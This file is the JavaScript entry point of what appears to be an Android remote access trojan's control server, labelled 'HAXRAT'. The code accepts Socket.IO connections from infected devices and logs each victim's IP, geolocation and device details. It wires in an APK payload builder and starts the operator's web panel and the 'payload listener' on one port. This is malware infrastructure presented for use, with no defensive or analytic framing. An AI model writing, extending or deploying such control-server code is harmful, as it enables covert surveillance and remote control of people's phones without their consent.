const
    express = require('express'),
    app = express(),
    http = require('http'),
    server = http.createServer(app), // Unified server
    IO = require('socket.io')(server), // Attach Socket.IO to the unified server
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Use the attached IO instance directly
let client_io = IO; 

client_io.sockets.pingInterval = 30000;
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }
});

// Setup Express settings
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// THE ONLY LISTEN CALL
// This starts BOTH the web panel and the payload listener on the same port
server.listen(CONST.web_port, '0.0.0.0', () => {
    console.log('HAXRAT Unified Server running on Port ' + CONST.web_port);
});
    
